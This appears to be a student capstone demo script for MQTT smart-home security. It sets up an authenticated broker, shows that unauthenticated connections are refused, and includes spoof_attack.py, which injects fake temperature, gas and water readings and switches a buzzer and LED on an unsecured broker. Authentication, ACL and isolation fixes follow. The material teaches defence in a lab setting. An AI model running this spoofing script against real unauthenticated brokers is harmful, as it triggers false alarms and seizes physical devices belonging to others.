# ============================================================
#  MQTT Security Demo — Attack & Mitigation Scripts
#  Capstone Project: Secure IoT Smart Home System
# ============================================================
#
#  SETUP:
#  Main Laptop (Windows)  → MQTT Broker (Docker) + Node-RED
#  Attacker Laptop (Kali) → mosquitto_pub / mosquitto_sub / flood script
#  Both connected to same mobile hotspot
#
#  Install on Kali:
#      sudo apt update
#      sudo apt install mosquitto-clients python3 python3-pip
#      pip3 install paho-mqtt
# ============================================================


# ===========================================================
#  DEMO PART 1 — MQTT BROKER SETUP DEMONSTRATION
# ===========================================================
#
#  Show faculty that broker is running with authentication.
#
#  On Main Laptop (Windows) — run these in CMD/PowerShell:
#
#  Start broker:
#      docker run -it -p 1883:1883 --name mqtt_broker eclipse-mosquitto
#
#  Verify broker is running:
#      docker ps
#
#  Show broker config (authentication enabled):
#      docker exec mqtt_broker cat /mosquitto/config/mosquitto.conf
#
#  Test broker is alive from main laptop using valid credentials:
#      mosquitto_sub -h localhost -p 1883 -u testuser -P testpass -t "capstone/#" -v
#
#  On a second terminal, publish a test message:
#      mosquitto_pub -h localhost -p 1883 -u testuser -P testpass -t "capstone/test" -m "BrokerAlive"
#
#  ✅ SHOW: Message appears on subscriber terminal → broker is working
# ===========================================================


# ===========================================================
#  DEMO PART 2 — UNAUTHORIZED ACCESS ATTEMPT
# ===========================================================
#
#  On Kali Linux laptop — demonstrates attacker trying to
#  connect WITHOUT valid credentials.
#
#  Step 1: Attacker tries to subscribe without credentials
#
#      mosquitto_sub -h 10.244.221.76 -p 1883 -t "capstone/#" -v
#
#  Expected result:
#      Connection Refused: not authorised
#
#  ✅ SHOW TO FACULTY: Broker rejects unauthenticated connection
#
#  Step 2: Attacker tries with wrong password
#
#      mosquitto_sub -h 10.244.221.76 -p 1883 -u testuser -P wrongpass -t "capstone/#" -v
#
#  Expected result:
#      Connection Refused: bad user name or password
#
#  ✅ SHOW TO FACULTY: Even correct username with wrong password is rejected
#
#  Step 3: Attacker tries to publish without credentials
#
#      mosquitto_pub -h 10.244.221.76 -p 1883 -t "esp32/temp" -m "999"
#
#  Expected result:
#      Connection Refused: not authorised
#      Dashboard value stays unchanged
#
#  ✅ KEY POINT: Authentication is the first line of defense
# ===========================================================


# ===========================================================
#  DEMO PART 3A — MQTT SPOOFING ATTACK (No Auth — Vulnerable)
# ===========================================================
#
#  To demonstrate the IMPACT of spoofing, temporarily disable
#  authentication on broker so faculty can see what happens
#  WITHOUT security. Then re-enable to show mitigation.
#
#  On Main Laptop — create a temporary UNSECURED broker:
#
#      docker run -it -p 1884:1883 --name mqtt_noauth eclipse-mosquitto mosquitto -c /mosquitto/config/mosquitto.conf
#
#  Or simply run broker on port 1884 with no auth config.
#  Change Node-RED broker port temporarily to 1884 for demo.
#
#  --- NOW ON KALI LINUX ---

# Script: spoof_attack.py
# Run on Kali: python3 spoof_attack.py

import paho.mqtt.client as mqtt
import time
import random

# !! For attack demo use the UNSECURED broker port (1884) !!
# After demo switch back to secured 1883
BROKER_IP   = "10.244.221.76"  # Main laptop IP
BROKER_PORT = 1884              # Unsecured broker port for demo

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[ATTACKER] Connected to MQTT broker — NO authentication required!")
        print("[ATTACKER] Starting spoofing attack...\n")
    else:
        print(f"[ATTACKER] Connection failed: {rc}")

client = mqtt.Client("AttackerNode")
client.on_connect = on_connect
client.connect(BROKER_IP, BROKER_PORT)
client.loop_start()
time.sleep(1)

print("=" * 55)
print("  MQTT SPOOFING ATTACK DEMONSTRATION")
print("  Injecting fake sensor data into IoT system")
print("=" * 55)

attacks = [
    # (topic, value, description)
    ("esp32/temp",        "99",     "Injecting FAKE high temperature → triggers fire alert"),
    ("esp32/gas",         "4095",   "Injecting FAKE gas reading → triggers gas alarm"),
    ("esp32/gas/status",  "ALERT",  "Directly setting gas status to ALERT"),
    ("capstone/alert",    "GAS_DETECTED", "Triggering GAS alert on dashboard"),
    ("pico2/water/level", "0",      "Setting water level to 0 → critical alert"),
    ("pico2/water/status","CRITICAL","Triggering water CRITICAL status"),
    ("capstone/esp32/led","ON",     "Turning ON ESP32 LED remotely"),
    ("capstone/esp32/buzzer","ON",  "Activating buzzer remotely"),
]

for topic, value, description in attacks:
    print(f"\n[ATTACK] {description}")
    print(f"         Topic: {topic}  |  Payload: {value}")
    client.publish(topic, value)
    time.sleep(2)  # pause so faculty can see each effect on dashboard

print("\n[ATTACKER] Attack complete. Check Node-RED dashboard for impact.")
client.loop_stop()
client.disconnect()


# ===========================================================
#  DEMO PART 3B — SHOW IMPACT ON DASHBOARD
# ===========================================================
#
#  While spoof_attack.py runs on Kali, show faculty:
#
#  1. Dashboard shows Temperature: 99°C  → fake fire alert
#  2. Dashboard shows Gas: ALERT         → fake gas alarm
#  3. Dashboard shows Water: CRITICAL    → fake water alert
#  4. Buzzer triggered remotely
#  5. LED turned ON remotely
#
#  Key message to faculty:
#  "Without authentication, any device on the network can
#   inject false data, trigger false alarms, or take control
#   of physical devices — this is a real IoT security risk."
# ===========================================================


# ===========================================================
#  DEMO PART 4 — MITIGATION & SECURITY FIXES
# ===========================================================
#
#  After showing the attack, demonstrate the fixes:
#
#  FIX 1: Re-enable Authentication
#  --------------------------------
#  Switch Node-RED back to port 1883 (authenticated broker).
#  Now run spoof_attack.py again but change port to 1883
#  and remove credentials → show it fails.
#
#  FIX 2: Topic-level Access Control (ACL)
#  ----------------------------------------
#  Show mosquitto ACL config that restricts which users
#  can publish to which topics.
#
#  Mosquitto ACL file (/mosquitto/config/acl.conf):
#
#      user testuser
#      topic readwrite capstone/#
#      topic readwrite esp32/#
#      topic readwrite pico2/#
#      topic readwrite arm/#
#
#  This means ONLY testuser can publish/subscribe.
#  Any other user is denied even if they connect.
#
#  Add to mosquitto.conf:
#      acl_file /mosquitto/config/acl.conf
#
#  FIX 3: Network Isolation
#  -------------------------
#  In real deployment: IoT devices on separate VLAN.
#  In your demo: show that broker only accepts connections
#  from hotspot IP range (10.244.x.x).
#
#  FIX 4: Show Secured Attacker Attempt Fails
#  --------------------------------------------
#  Run this on Kali after re-enabling auth:

# Script: mitigation_test.py
# Run on Kali AFTER re-enabling authentication

import paho.mqtt.client as mqtt2
import time

BROKER_IP   = "10.244.221.76"
BROKER_PORT = 1883  # Secured broker

def on_connect_secured(client, userdata, flags, rc):
    codes = {
        0: "Connected",
        1: "Wrong protocol",
        2: "Invalid client ID",
        3: "Broker unavailable",
        4: "Bad credentials",
        5: "Not authorised"
    }
    if rc == 0:
        print("[!] WARNING: Connected — check broker auth config")
    else:
        print(f"[✅ MITIGATION] Connection REJECTED: {codes.get(rc, 'Unknown error')} (rc={rc})")
        print("[✅ MITIGATION] Spoofing attack BLOCKED by authentication")

client2 = mqtt2.Client("AttackerBlocked")
client2.on_connect = on_connect_secured

print("=" * 55)
print("  MITIGATION DEMONSTRATION")
print("  Attacker attempting WITHOUT credentials...")
print("=" * 55)

try:
    client2.connect(BROKER_IP, BROKER_PORT)
    client2.loop_start()
    time.sleep(3)
    client2.loop_stop()
    client2.disconnect()
except Exception as e:
    print(f"[✅ MITIGATION] Attack blocked at network level: {e}")
